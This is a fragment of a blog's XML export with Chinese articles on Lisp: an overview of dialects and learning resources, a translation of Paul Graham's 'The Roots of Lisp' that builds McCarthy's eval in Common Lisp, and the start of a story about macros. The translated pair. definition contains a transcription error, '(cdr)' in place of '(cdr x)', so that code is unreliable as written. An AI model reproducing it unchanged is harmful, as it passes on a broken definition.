        <category>编程语言</category>
        <category>Lisp</category>
      </categories>
      <tags>
        <tag>Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>(转)Lisp概况与学习方法</title>
    <url>/blog/plang/lisp/lispdiary/lispgkxx/</url>
    <content><![CDATA[<p>Lisp名字来源于LISt Processor，也就是列表处理的意思。初学者第一眼见到Lisp往往印象最深的也就是里面成堆的括号。的确没错，括号就是该语言最显著的特点。整个语言的源代码也是以括号作为构造其语法树的依据。</p>
<p>很多初学者有考古的爱好，听闻了传说中的7公理，所谓7个操作符可以构造一切，并且为止着迷。且不说这7公理是不是真的能构造出目前很多应用上所需要的一切，就算真的能，性能也必定很低，因为具备的材料太少，很多基础的东西也要从头开始构造。而精简的构造似乎并没有为实际应用带来多少好处，图灵机的构造比这几个公理更简单，但是你不会看到有多少人用图灵机编程。制造计算机系统就是一个寻找扩展性、成本、体积、功耗等等参考的平衡点的过程，不在那个平衡点则很容易被淘汰。</p>
<p>最初版的Lisp早已没人使用，取而代之的是无数人基于Lisp的特点构造出的一系列类似Lisp的语言，无论他们名字里有没有Lisp，他们已经不是Lisp了，但是他们又是带有Lisp特点的语言，所以又被叫做Lisp的方言。所以看到某本书里介绍的某个Lisp的源代码，里面无数的括号的组织和括号之间关键字，千万不要觉得很神秘，因为那已经完全是个人或者某个组织定义的，不是非得那么设计的，如果你愿意，你也可以实现一个自己的Lisp方言。</p>
<p>Lisp以括号的简洁形态激励了无数人和无数组织制定和实现自己的Lisp方言、一旦有后来者不满意又会对之前存在的Lisp标准和实现进行“总结”而开发新的Lisp，加上开发新的Lisp的确简单（因为其语法简单，非常繁琐的语法分析部分很容易写），则更是激励无数初学者实现自己的Lisp，甚至有教科书的作业就是实现Lisp，所以到目前，已经根本无法统计到底存在多少种Lisp或者说Lisp的方言了。但是总的来说，目前还是有一些名气比较大的Lisp分类，用户比较多、实现比较多、资料也比较多，学习的时候可以优先选择下面三种：</p>
<h2 id="Scheme："><a href="#Scheme：" class="headerlink" title="Scheme："></a>Scheme：</h2><p>非常小型的Lisp方言，内容少至早期标准也仅仅有几十页，非常适合初学者学习。由于早期似乎被用作教学语言，所以并没有针对项目开发设计一些必要的措施，包括模块、名字空间等等。最新的标准正在尝试弥补这个缺陷但是进展似乎比较缓慢。目前来说比较好的实现有：</p>
<p>1. DrRacket，开源实现，自带IDE，有高亮、调试功能，支持Scheme相关的几种方言，自带手册比较完备，适合初学者。</p>
<p>2. Chez Scheme，传说中的异常高效的Scheme实现，支持最新标准，且作者是Scheme实现的权威，品质有保证。但是该软件为专有软件，需要购买使用。作者在其首页提供免费精简版Petite Chez Scheme。</p>
<p>3. Guile，GNU的扩展语言，一些GNU的软件就是用这个实现进行扩展的。</p>
<p>等等……</p>
<p>当然，因为Scheme语言的确比较精简，自己实现一个Scheme也是不错的选择。难度并没有想象中的大，实现后还可以嵌入在自己的项目中于扩展用。</p>
<p>Scheme学习资料非常多，包括</p>
<p>《The Scheme Programming Language》这本书是之前介绍的Chez Scheme的作者R. Kent Dybvig写的，内容详尽、语言的每个特性都给出示例。</p>
<p>《Structure and Interpretation of Computer Programs》这本书又叫做“计算机程序的构造和解释”，虽然通常被认为是一本入门书，但是实际上内容涵盖很广，包括计算机原理、编译器构造、符号计算、电子电路等等，编程语言成了描述这些内容的无关紧要的工具，做完大部分习题很有挑战性。</p>
<p>《Revised5 Report on the Algorithmic Language Scheme》又被叫做“R5RS”，初看这个题目有点莫名其妙，实际上这是一份类似Scheme标准的东西，里面最直接的描述了Scheme的关键特性，甚至有点面向语言实现者的意味。该标准之后还在不断地出第六份第七份等等，增加了一些标准库的内容。读通这本可以几乎完全掌握Scheme了。</p>
<p>因为Scheme的资料太多，暂时就列出上面三份，能看完这些掌握得就差不多了。</p>
<h2 id="Common-Lisp："><a href="#Common-Lisp：" class="headerlink" title="Common Lisp："></a>Common Lisp：</h2><p>又被叫做CL，是一个典型的“总结性”Lisp方言，也就是一次把各个Lisp方言的特性进行总结的尝试，并且获得了一定的成功。该语言极其复杂以至于很少有实现能比较完整实现其标准（虽然不少CL的实现都自称自己完整实现了标准）。比较常见的实现有：</p>
<p>1. SBCL，开源实现，来自与CMUCL，编译到原生码执行性能有保障。</p>
<p>2. CLISP，一些教科书推荐的Common Lisp实现，性能比较差。</p>
<p>等等……</p>
<p>PS：据Common Lisp界著名人物小妮补充的部分CL实现现状：</p>
<p>Allegro Cl, Lispworks, CCL, SBCL, ECL, CMUCL(已死)，CLISP（垂死），ABCL，MKCL（半主流，这个是从ECL改过来的），mocl（小众），Corman Lisp（已死）常见的教材有：</p>
<p>《ANSI Common Lisp》传统风格的编程语言教科书，内容详尽。</p>
<p>《Practical Common Lisp》据说得了Jolt大奖，里面以一系列所谓现实生活中的例子来推进教学，喜欢这种类型教材的可以看看。</p>
<h2 id="Emacs-Lisp："><a href="#Emacs-Lisp：" class="headerlink" title="Emacs Lisp："></a>Emacs Lisp：</h2><p>这算是一种专用Lisp，也就是说它并不是通用编程语言，而仅仅是用于扩展一个叫Emacs的文本编辑器。这个文本编辑器历史悠久，按键绑定灵活，用这种编程语言进行扩展后实现一些比较简单的功能可以简化文本编辑工作（当然本身还有其它问题，是否值得专门学习有很大争议）。学习Emacs Lisp是在对Emacs这个文本编辑器产生兴趣并且初步掌握后，想进一步探索和扩展的很自然的选择。</p>
<p>比较常见的实现有……当然是GNU Emacs，本身就是内嵌在Emacs编辑器中的。而最好的教材，毫无疑问就是自带的手册。推荐学习过程为</p>
<p>第一步：初步掌握Emacs编辑器的操作</p>
<p>第二步：学会一些基本的语法</p>
<p>第三部：尝试写一些扩展，需要的功能就去查找手册，找到该功能的接口后用之前学到的基本语法组合起来。</p>
<p>正如之前介绍的Lisp的特性，仅仅以括号作为明显的特征，激励无数人不断总结和发明自己的方言，这些方言没法介绍完，具体哪些值得学习观察。有一些现代的Lisp方言和实现挺有价值，比如Clojure，可以运行在JVM上，丰富的语法，还能运行在JVM上，重复利用之前用别的运行在JVM上的语言写的程序，这就是一个不错的选择。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
      </categories>
      <tags>
        <tag>Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>(转)Lisp之根源</title>
    <url>/blog/plang/lisp/lispdiary/lispzgy/</url>
    <content><![CDATA[<p><strong>保罗格雷厄姆</strong></p>
<p>约翰麦卡锡于1960年发表了一篇非凡的论文,他在这篇论文中对编程的贡献有如欧几里德对几何的贡献.他向我们展示了,在只给定几个简单的操作符和一个表示函数的记号的基础上,如何构造出一个完整的编程语言. 麦卡锡称这种语言为Lisp, 意为ListProcessing,因为他的主要思想之一是用一种简单的数据结构表(list)来代表代码和数据.</p>
<p>值得注意的是,麦卡锡所作的发现,不仅是计算机史上划时代的大事,而且是一种在我们这个时代编程越来越趋向的模式.我认为目前为止只有两种真正干净利落,始终如一的编程模式:C语言模式和Lisp语言模式.此二者就象两座高地,在它们中间是尤如沼泽的低地.随着计算机变得越来越强大,新开发的语言一直在坚定地趋向于Lisp模式.</p>
<p>二十年来,开发新编程语言的一个流行的秘决是,取C语言的计算模式,逐渐地往上加Lisp模式的特性,例如运行时类型和无用单元收集.</p>
<p>在这篇文章中我尽可能用最简单的术语来解释约翰麦卡锡所做的发现.关键是我们不仅要学习某个人四十年前得出的有趣理论结果,而且展示编程语言的发展方向.</p>
<p>Lisp的不同寻常之处–也就是它优质的定义–是它能够自己来编写自己.为了理解约翰麦卡锡所表述的这个特点,我们将追溯他的步伐,并将他的数学标记转换成能够运行的CommonLisp代码.</p>
<h2 id="七个原始操作符"><a href="#七个原始操作符" class="headerlink" title="七个原始操作符"></a>七个原始操作符</h2><p>开始我们先定义<em>表达式</em>.表达式或是一个<em>原子</em>(atom),它是一个字母序列(如foo),或是一个由零个或多个表达式组成的<em>表</em>(list),表达式之间用空格分开,放入一对括号中. 以下是一些表达式:</p>
<pre><code>foo
()
(foo)
(foo bar)
(a b (c) d)
</code></pre>
<p>最后一个表达式是由四个元素组成的表, 第三个元素本身是由一个元素组成的表.</p>
<p>在算术中表达式 1 + 1 得出值2. 正确的Lisp表达式也有值.</p>
<p>如果表达式<em>e</em>得出值<em>v</em>,我们说<em>e返回v</em>.</p>
<p>下一步我们将定义几种表达式以及它们的返回值.</p>
<p>如果一个表达式是表,我们称第一个元素为<em>操作符</em>,其余的元素为<em>自变量</em>.我们将定义七个原始(从公理的意义上说)操作符:quote,atom,eq,car,cdr,cons,和cond.</p>
<ol>
<li><p>(quote <em>x</em>) 返回<em>x</em>.为了可读性我们把(quote <em>x</em>)简记为’<em>x</em>.</p>
<pre><code>&gt; (quote a)
a
&gt; &#39;a
a
&gt; (quote (a b c))
(a b c)
</code></pre>
</li>
<li><p>(atom <em>x</em>)返回原子t如果<em>x</em>的值是一个原子或是空表,否则返回().在Lisp中我们按惯例用原子t表示真, 而用空表表示假.</p>
<pre><code>&gt; (atom &#39;a)
t
&gt; (atom &#39;(a b c))
()
&gt; (atom &#39;())
t
</code></pre>
<p>既然有了一个自变量需要求值的操作符, 我们可以看一下quote的作用.通过引用(quote)一个表,我们避免它被求值.一个未被引用的表作为自变量传给象atom这样的操作符将被视为代码:</p>
<pre><code>&gt; (atom (atom &#39;a))
t
</code></pre>
<p>反之一个被引用的表仅被视为表, 在此例中就是有两个元素的表:</p>
<pre><code>&gt; (atom &#39;(atom &#39;a))
()
</code></pre>
<p>这与我们在英语中使用引号的方式一致. Cambridge(剑桥)是一个位于麻萨诸塞州有90000人口的城镇.    而’’Cambridge’’是一个由9个字母组成的单词.</p>
<p>引用看上去可能有点奇怪因为极少有其它语言有类似的概念.它和Lisp最与众不同的特征紧密联系:代码和数据由相同的数据结构构成, 而我们用quote操作符来区分它们.</p>
</li>
<li><p>(eq <em>x y</em>)返回t如果<em>x</em>和<em>y</em>的值是同一个原子或都是空表, 否则返回().</p>
<pre><code>&gt; (eq &#39;a &#39;a)
t
&gt; (eq &#39;a &#39;b)
()
&gt; (eq &#39;() &#39;())
t
</code></pre>
</li>
<li><p>(car <em>x</em>)期望<em>x</em>的值是一个表并且返回<em>x</em>的第一个元素.</p>
<pre><code>&gt; (car &#39;(a b c))
a
</code></pre>
</li>
<li><p>(cdr <em>x</em>)期望<em>x</em>的值是一个表并且返回<em>x</em>的第一个元素之后的所有元素.</p>
<pre><code>&gt; (cdr &#39;(a b c))
(b c)
</code></pre>
</li>
<li><p>(cons <em>x y</em>)期望<em>y</em>的值是一个表并且返回一个新表,它的第一个元素是<em>x</em>的值,    后面跟着<em>y</em>的值的各个元素.</p>
<pre><code>&gt; (cons &#39;a &#39;(b c))
(a b c)
&gt; (cons &#39;a (cons &#39;b (cons &#39;c &#39;())))
(a b c)
&gt; (car (cons &#39;a &#39;(b c)))
a
&gt; (cdr (cons &#39;a &#39;(b c)))
(b c)
</code></pre>
</li>
<li><p>(cond ($$p_1$$<del>…$$e_1$$) …($$p_n$$</del>…$$e_n$$)) 的求值规则如下.<em>p</em>表达式依次求值直到有一个返回t.    如果能找到这样的<em>p</em>表达式,相应的<em>e</em>表达式的值作为整个cond表达式的返回值.</p>
<pre><code>&gt; (cond ((eq &#39;a &#39;b) &#39;first)
        ((atom &#39;a)  &#39;second))
second
</code></pre>
<p>当表达式以七个原始操作符中的五个开头时,它的自变量总是要求值的.我们称这样的操作符为<em>函数</em>.</p>
</li>
</ol>
<h2 id="函数的表示"><a href="#函数的表示" class="headerlink" title="函数的表示"></a>函数的表示</h2><p>接着我们定义一个记号来描述函数.函数表示为(lambda ($$p_1$$…$$p_n$$) <em>e</em>),其中*$$p_1$$…$$p_n$$<em>是原子(叫做</em>参数*),<em>e</em>是表达式.如果表达式的第一个元素形式如上</p>
<p><code>((lambda ($$p_1$$...$$p_n$$) e) $$a_1$$...$$a_n$$)</code></p>
<p>则称为<em>函数调用</em>.它的值计算如下.每一个表达式$$a_i$$先求值,然后<em>e</em>再求值.在<em>e</em>的求值过程中,每个出现在<em>e</em>中的<em>pi</em>的值是相应的<em>ai</em>在最近一次的函数调用中的值.</p>
<pre><code>&gt; ((lambda (x) (cons x &#39;(b))) &#39;a)
(a b)
&gt; ((lambda (x y) (cons x (cdr y)))
   &#39;z
   &#39;(a b c))
(z b c)
</code></pre>
<p>如果一个表达式的第一个元素<em>f</em>是原子且<em>f</em>不是原始操作符</p>
<p><code>(f $$a_1$$...$$a_n$$)</code></p>
<p>并且<em>f</em>的值是一个函数(lambda (<em>$$p_1$$…$$p_n$$</em>)),则以上表达式的值就是</p>
<p><code>((lambda ($$p_1$$...$$p_n$$) e) $$a_1$$...$$a_n$$)</code></p>
<p>的值. 换句话说,参数在表达式中不但可以作为自变量也可以作为操作符使用:</p>
<pre><code>&gt; ((lambda (f) (f &#39;(b c)))
   &#39;(lambda (x) (cons &#39;a x)))
(a b c)
</code></pre>
<p>有另外一个函数记号使得函数能提及它本身,这样我们就能方便地定义递归函数.记号</p>
<p><code>(label f (lambda ($$p_1$$...$$p_n$$) e))</code></p>
<p>表示一个象(lambda (<em>$$p_1$$…$$p_n$$</em>) <em>e</em>)那样的函数,加上这样的特性:任何出现在<em>e</em>中的<em>f</em>将求值为此label表达式,就好象<em>f</em>是此函数的参数.</p>
<p>假设我们要定义函数(subst <em>x y z</em>),它取表达式<em>x</em>,原子<em>y</em>和表<em>z</em>做参数,返回一个象<em>z</em>那样的表,不过<em>z</em>中出现的<em>y</em>(在任何嵌套层次上)被<em>x</em>代替.</p>
<pre><code>&gt; (subst &#39;m &#39;b &#39;(a b (a b c) d))
(a m (a m c) d)
</code></pre>
<p>我们可以这样表示此函数</p>
<pre><code>(label subst (lambda (x y z)
               (cond ((atom z)
                      (cond ((eq z y) x)
                            (&#39;t z)))
                     (&#39;t (cons (subst x y (car z))
                               (subst x y (cdr z)))))))
</code></pre>
<p>我们简记<em>f</em>&#x3D;(label <em>f</em> (lambda (<em>$$p_1$$…$$p_n$$</em>) <em>e</em>))为</p>
<p><code>(defun f (p1...pn) e)</code></p>
<p>于是</p>
<pre><code>(defun subst (x y z)
  (cond ((atom z)
         (cond ((eq z y) x)
               (&#39;t z)))
        (&#39;t (cons (subst x y (car z))
                  (subst x y (cdr z))))))
</code></pre>
<p>偶然地我们在这儿看到如何写cond表达式的缺省子句.</p>
<p>第一个元素是’t的子句总是会成功的. 于是</p>
<p><code>(cond (x y) (&#39;t z))</code></p>
<p>等同于我们在某些语言中写的</p>
<p><code>if x then y else z</code></p>
<h2 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h2><p>既然我们有了表示函数的方法,我们根据七个原始操作符来定义一些新的函数.为了方便我们引进一些常见模式的简记法.</p>
<p>我们用c<em>x</em>r,其中<em>x</em>是a或d的序列,来简记相应的car和cdr的组合. 比如(cadr <em>e</em>)是(car (cdr <em>e</em>))的简记,它返回<em>e</em>的第二个元素.</p>
<pre><code>&gt; (cadr &#39;((a b) (c d) e))
(c d)
&gt; (caddr &#39;((a b) (c d) e))
e
&gt; (cdar &#39;((a b) (c d) e))
(b)
</code></pre>
<p>我们还用(list <em>$$e_1$$…$$e_n$$</em>)表示(cons *$$e_1$$…(cons <em>$$e_n$$</em>‘()) …).</p>
<pre><code>&gt; (cons &#39;a (cons &#39;b (cons &#39;c &#39;())))
(a b c)
&gt; (list &#39;a &#39;b &#39;c)
(a b c)
</code></pre>
<p>现在我们定义一些新函数.</p>
<p>我在函数名后面加了点,以区别函数和定义它们的原始函数,也避免与现存的commonLisp的函数冲突.</p>
<ol>
<li><p>(null. <em>x</em>)测试它的自变量是否是空表.</p>
<pre><code>(defun null. (x)
  (eq x &#39;()))

&gt; (null. &#39;a)
()
&gt; (null. &#39;())
t
</code></pre>
</li>
<li><p>(and. <em>x y</em>)返回t如果它的两个自变量都是t, 否则返回().</p>
<pre><code>(defun and. (x y)
  (cond (x (cond (y &#39;t) (&#39;t &#39;())))
        (&#39;t &#39;())))

&gt; (and. (atom &#39;a) (eq &#39;a &#39;a))
t
&gt; (and. (atom &#39;a) (eq &#39;a &#39;b))
()
</code></pre>
</li>
<li><p>(not. <em>x</em>)返回t如果它的自变量返回(),返回()如果它的自变量返回t.</p>
<pre><code>(defun not. (x)
  (cond (x &#39;())
        (&#39;t &#39;t)))

&gt; (not. (eq &#39;a &#39;a))
()
&gt; (not. (eq &#39;a &#39;b))
t
</code></pre>
</li>
<li><p>(append. x y)取两个表并返回它们的连结.</p>
<pre><code>(defun append. (x y)
   (cond ((null. x) y)
         (&#39;t (cons (car x) (append. (cdr x) y)))))

&gt; (append. &#39;(a b) &#39;(c d))
(a b c d)
&gt; (append. &#39;() &#39;(c d))
(c d)
</code></pre>
</li>
<li><p>(pair. <em>x y</em>)取两个相同长度的表,返回一个由双元素表构成的表,双元素表是相应位置的x,y的元素对.</p>
<pre><code>(defun pair. (x y)
  (cond ((and. (null. x) (null. y)) &#39;())
        ((and. (not. (atom x)) (not. (atom y)))
         (cons (list (car x) (car y))
               (pair. (cdr) (cdr y))))))

&gt; (pair. &#39;(x y z) &#39;(a b c))
((x a) (y b) (z c))
</code></pre>
</li>
<li><p>(assoc. <em>x y</em>)取原子<em>x</em>和形如pair.函数所返回的表<em>y</em>,返回<em>y</em>中第一个符合如下条件的表的第二个元素:它的第一个元素是<em>x</em>.</p>
<pre><code>(defun assoc. (x y)
  (cond ((eq (caar y) x) (cadar y))
        (&#39;t (assoc. x (cdr y)))))

&gt; (assoc. &#39;x &#39;((x a) (y b)))
a
&gt; (assoc. &#39;x &#39;((x new) (x a) (y b)))
new
</code></pre>
</li>
</ol>
<h2 id="一个惊喜"><a href="#一个惊喜" class="headerlink" title="一个惊喜"></a>一个惊喜</h2><p>因此我们能够定义函数来连接表,替换表达式等等.也许算是一个优美的表示法,那下一步呢?</p>
<p>现在惊喜来了.</p>
<p>我们可以写一个函数作为我们语言的解释器:此函数取任意Lisp表达式作自变量并返回它的值.如下所示:</p>
<pre><code>(defun eval. (e a)
  (cond 
    ((atom e) (assoc. e a))
    ((atom (car e))
     (cond 
       ((eq (car e) &#39;quote) (cadr e))
       ((eq (car e) &#39;atom)  (atom   (eval. (cadr e) a)))
       ((eq (car e) &#39;eq)    (eq     (eval. (cadr e) a)
                                    (eval. (caddr e) a)))
       ((eq (car e) &#39;car)   (car    (eval. (cadr e) a)))
       ((eq (car e) &#39;cdr)   (cdr    (eval. (cadr e) a)))
       ((eq (car e) &#39;cons)  (cons   (eval. (cadr e) a)
                                    (eval. (caddr e) a)))
       ((eq (car e) &#39;cond)  (evcon. (cdr e) a))
       (&#39;t (eval. (cons (assoc. (car e) a)
                        (cdr e))
                  a))))
    ((eq (caar e) &#39;label)
     (eval. (cons (caddar e) (cdr e))
            (cons (list (cadar e) (car e)) a)))
    ((eq (caar e) &#39;lambda)
     (eval. (caddar e)
            (append. (pair. (cadar e) (evlis. (cdr  e) a))
                     a)))))

(defun evcon. (c a)
  (cond ((eval. (caar c) a)
         (eval. (cadar c) a))
        (&#39;t (evcon. (cdr c) a))))

(defun evlis. (m a)
  (cond ((null. m) &#39;())
        (&#39;t (cons (eval.  (car m) a)
                  (evlis. (cdr m) a)))))
</code></pre>
<p>eval.的定义比我们以前看到的都要长. 让我们考虑它的每一部分是如何工作的.</p>
<p>eval.有两个自变量: e是要求值的表达式,a是由一些赋给原子的值构成的表,这些值有点象函数调用中的参数.这个形如pair.的返回值的表叫做<em>环境</em>.正是为了构造和搜索这种表我们才写了pair.和assoc..</p>
<p>eval.的骨架是一个有四个子句的cond表达式. 如何对表达式求值取决于它的类型.第一个子句处理原子. 如果e是原子, 我们在环境中寻找它的值:</p>
<pre><code>&gt; (eval. &#39;x &#39;((x a) (y b)))
a
</code></pre>
<p>第二个子句是另一个cond, 它处理形如(<em>a</em> …)的表达式, 其中<em>a</em>是原子.这包括所有的原始操作符, 每个对应一条子句.</p>
<pre><code>&gt; (eval. &#39;(eq &#39;a &#39;a) &#39;())
t
&gt; (eval. &#39;(cons x &#39;(b c))
         &#39;((x a) (y b)))
(a b c)
</code></pre>
<p>这几个子句(除了quote)都调用eval.来寻找自变量的值.</p>
<p>最后两个子句更复杂些.为了求cond表达式的值我们调用了一个叫evcon.的辅助函数.它递归地对cond子句进行求值,寻找第一个元素返回t的子句.如果找到了这样的子句, 它返回此子句的第二个元素.</p>
<pre><code>&gt; (eval. &#39;(cond ((atom x) &#39;atom)
                (&#39;t &#39;list))
         &#39;((x &#39;(a b))))
list
</code></pre>
<p>第二个子句的最后部分处理函数调用.它把原子替换为它的值(应该是lambda或label表达式)然后对所得结果表达式求值.<br>于是</p>
<pre><code>(eval. &#39;(f &#39;(b c))
       &#39;((f (lambda (x) (cons &#39;a x)))))
</code></pre>
<p>变为</p>
<pre><code>(eval. &#39;((lambda (x) (cons &#39;a x)) &#39;(b c))
       &#39;((f (lambda (x) (cons &#39;a x)))))
</code></pre>
<p>它返回(a b c).</p>
<p>eval.的最后cond两个子句处理第一个元素是lambda或label的函数调用.为了对label表达式求值,先把函数名和函数本身压入环境,然后调用eval.对一个内部有lambda的表达式求值. 即:</p>
<pre><code>(eval. &#39;((label firstatom (lambda (x)
                            (cond ((atom x) x)
                                  (&#39;t (firstatom (car x))))))
         y)
       &#39;((y ((a b) (c d)))))
</code></pre>
<p>变为</p>
<pre><code>(eval. &#39;((lambda (x)
           (cond ((atom x) x)
                 (&#39;t (firstatom (car x)))))
         y)
        &#39;((firstatom
           (label firstatom (lambda (x)
                            (cond ((atom x) x)
                                  (&#39;t (firstatom (car x)))))))
          (y ((a b) (c d)))))
</code></pre>
<p>最终返回a.</p>
<p>最后,对形如((lambda (<em>$$p_1$$…$$p_n$$</em>) <em>e</em>) <em>$$a_1$$…$$a_n$$</em>)的表达式求值,先调用evlis.来求得自变量(<em>$$a_1$$…$$a_n$$</em>)对应的值(<em>$$v_1$$…$$v_n$$</em>),把(<em>$$p_1$$~$$v_1$$</em>)…(<em>$$p_n$$~$$v_n$$</em>)添加到环境里,然后对<em>e</em>求值. 于是</p>
<pre><code>(eval. &#39;((lambda (x y) (cons x (cdr y)))
         &#39;a
         &#39;(b c d))
       &#39;())
</code></pre>
<p>变为</p>
<pre><code>(eval. &#39;(cons x (cdr y))
       &#39;((x a) (y (b c d))))
</code></pre>
<p>最终返回(a c d).</p>
<h2 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h2><p>既然理解了eval是如何工作的, 让我们回过头考虑一下这意味着什么.我们在这儿得到了一个非常优美的计算模型.仅用quote,atom,eq,car,cdr,cons,和cond,我们定义了函数eval.,它事实上实现了我们的语言,用它可以定义任何我们想要的额外的函数.</p>
<p>当然早已有了各种计算模型–最著名的是图灵机.但是图灵机程序难以读懂.如果你要一种描述算法的语言, 你可能需要更抽象的,而这就是约翰麦卡锡定义Lisp的目标之一.</p>
<p>约翰麦卡锡于1960年定义的语言还缺不少东西. 它没有副作用,没有连续执行(它得和副作用在一起才有用), 没有实际可用的数,没有动态可视域.但这些限制可以令人惊讶地用极少的额外代码来补救.Steele和Sussman在一篇叫做’’解释器的艺术’’的著名论文中描述了如何做到这点.</p>
<p>如果你理解了约翰麦卡锡的eval,那你就不仅仅是理解了程序语言历史中的一个阶段.这些思想至今仍是Lisp的语义核心. 所以从某种意义上,学习约翰麦卡锡的原著向我们展示了Lisp究竟是什么.与其说Lisp是麦卡锡的设计,不如说是他的发现.它不是生来就是一门用于人工智能, 快速原型开发或同等层次任务的语言.它是你试图公理化计算的结果(之一).</p>
<p>随着时间的推移, 中级语言, 即被中间层程序员使用的语言,正一致地向Lisp靠近.因此通过理解eval你正在明白将来的主流计算模式会是什么样.</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>把约翰麦卡锡的记号翻译为代码的过程中我尽可能地少做改动.我有过让代码更容易阅读的念头, 但是我还是想保持原汁原味.</p>
<p>在约翰麦卡锡的论文中,假用f来表示, 而不是空表.我用空表表示假以使例子能在Common Lisp中运行.</p>
<p>我略过了构造dotted pairs, 因为你不需要它来理解eval.我也没有提apply,虽然是apply(它的早期形式, 主要作用是引用自变量),被约翰麦卡锡在1960年称为普遍函数,eval只是不过是被apply调用的子程序来完成所有的工作.</p>
<p>我定义了list和c<em>x</em>r等作为简记法因为麦卡锡就是这么做的.实际上c<em>x</em>r等可以被定义为普通的函数. List也可以这样, 如果我们修改eval,这很容易做到, 让函数可以接受任意数目的自变量.</p>
<p>麦卡锡的论文中只有五个原始操作符.他使用了cond和quote,但可能把它们作为他的元语言的一部分.</p>
<p>同样他也没有定义逻辑操作符and和not,这不是个问题,因为它们可以被定义成合适的函数.</p>
<p>在eval.的定义中我们调用了其它函数如pair.和assoc.,但任何我们用原始操作符定义的函数调用都可以用eval.来代替.即</p>
<pre><code>(assoc. (car e) a)
</code></pre>
<p>能写成</p>
<pre><code>(eval. &#39;((label assoc.
                (lambda (x y)
                  (cond ((eq (caar y) x) (cadar y))
                        (&#39;t (assoc. x (cdr y))))))
         (car e)
         a)
        (cons (list &#39;e e) (cons (list &#39;a a) a)))
</code></pre>
<p>麦卡锡的eval有一个错误. 第16行是(相当于)(evlis. (cdr e) a)而不是(cdre),这使得自变量在一个有名函数的调用中被求值两次. 这显示当论文发表的时候,eval的这种描述还没有用IBM 704机器语言实现. 它还证明了如果不去运行程序,要保证不管多短的程序的正确性是多么困难.</p>
<p>我还在麦卡锡的论文中碰到一个问题. 在定义了eval之后,他继续给出了一些更高级的函数–接受其它函数作为自变量的函数.他定义了maplist:</p>
<pre><code>(label maplist
       (lambda (x f)
         (cond ((null x) &#39;())
               (&#39;t (cons (f x) (maplist (cdr x) f))))))
</code></pre>
<p>然后用它写了一个做微分的简单函数diff.但是diff传给maplist一个用<em>x</em>做参数的函数,对它的引用被maplist中的参数x所捕获.</p>
<p>这是关于动态可视域危险性的雄辩证据,即使是最早的更高级函数的例子也因为它而出错.可能麦卡锡在1960年还没有充分意识到动态可视域的含意.动态可视域令人惊异地在Lisp实现中存在了相当长的时间–直到Sussman和Steele于1975年开发了Scheme.词法可视域没使eval的定义复杂多少, 却使编译器更难写了.</p>
<h2 id="About-this-document-…"><a href="#About-this-document-…" class="headerlink" title="About this document …"></a>About this document …</h2><p><strong>Lisp之根源</strong></p>
<p>This document was generated usingthe<a href="http://www-texdev.mpce.mq.edu.au/l2h/docs/manual/"><strong>LaTeX</strong>2<code>HTML</code></a>translator Version 2K.1beta (1.48)</p>
<p>Copyright ? 1993, 1994, 1995, 1996,<a href="http://cbl.leeds.ac.uk/nikos/personal.html">NikosDrakos</a>, Computer BasedLearning Unit, University of Leeds.\Copyright ? 1997, 1998, 1999,<a href="http://www.maths.mq.edu.au/~ross/">RossMoore</a>,Mathematics Department,Macquarie University, Sydney.</p>
<p>The command line arguments were:<br><strong>latex2html</strong> <code>-split=0 roots_of_lisp.tex</code></p>
<p>The translation was initiated by Dai Yuwen on 2003-10-24</p>
<hr>
<h4 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h4><p><a href="">…欧几里德对几何的贡献.</a><a href="roots_of_lisp.html#tex2html1">^1^</a>:’’Recursive Functions of Symbolic Expressions and Their Computation by Machine, Part1.’’ <em>Communication of the ACM</em> 3:4, April 1960, pp. 184-195.</p>
<p><a href="">…当表达式以七个原始操作符中的五个开头时,它的自变量总是要求值的.</a><a href="roots_of_lisp.html#tex2html2">^2^</a>:   以另外两个操作符quote和cond开头的表达式以不同的方式求值. 当quote表达式求值时, 它的自变量不被求值,而是作为整个表达式的值返回. 在一个正确的cond表达式中, 只有L形路径上的子表达式会被求值.</p>
<p><a href="">…数.</a><a href="roots_of_lisp.html#tex2html3">^3^</a>:   逻辑上我们不需要为了这定义一个新的记号.在现有的记号中用一个叫做Y组合器的函数上的函数, 我们可以定义递归函数.可能麦卡锡在写这篇论文的时候还不知道Y组合器;无论如何, label可读性更强.</p>
<p><a href="">… 没有实际可用的数,</a><a href="roots_of_lisp.html#tex2html4">^4^</a>:   在麦卡锡的1960 年的Lisp中,做算术是可能的, 比如用一个有n个原子的表表示数n.</p>
<p><a href="">…的艺术’’的著名论文中描述了如何做到这点.</a><a href="roots_of_lisp.html#tex2html5">^5^</a>:   Guy Lewis Steele, Jr. and Gerald Jay Sussman, ``The Art of the Interpreter, or the Modularity Complex(Parts Zero,One,and Two),’’ MIT AL Lab Memo 453,May 1978.</p>
<p><a href="">… 对它的引用被maplist中的参数x所捕获.</a><a href="roots_of_lisp.html#tex2html6">^6^</a>:   当代的Lisp程序员在这儿会用mapcar代替maplist. 这个例子解开了一个谜团:maplist为什么会在Common Lisp中.它是最早的映射函数, mapcar是后来增加的.</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
      </categories>
      <tags>
        <tag>Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>Lisp macro宏的本质</title>
    <url>/blog/plang/lisp/lispdiary/macrobz/</url>
    <content><![CDATA[<p>本故事引自《实用Common Lisp编程》第8章：如何自定义宏。</p>
<p>很久以前，有一个由Lisp程序员们所组成的公司。那个年代相当久远，所以Lisp还没有宏，每次，任何不能用函数来定义或是用特殊操作符来完成的亊情都不得不完全通过手写来实现，这带来了很大的不便。不幸的是，这个公司的程序员们虽然杰出却非常懶惰。在他们的程序中，当需要编写大量单调乏味的代码时，他们往往会写下一个注释来描述想要在该位罝上编写的代码。更不幸的是，由于很懒情，他们也很讨厌回过头去实际编写那些注释所描述的代码。不久，这个公司就有了一大堆无法运行的程序，因为它们全都是代表着尚需编写代码的注释。</p>
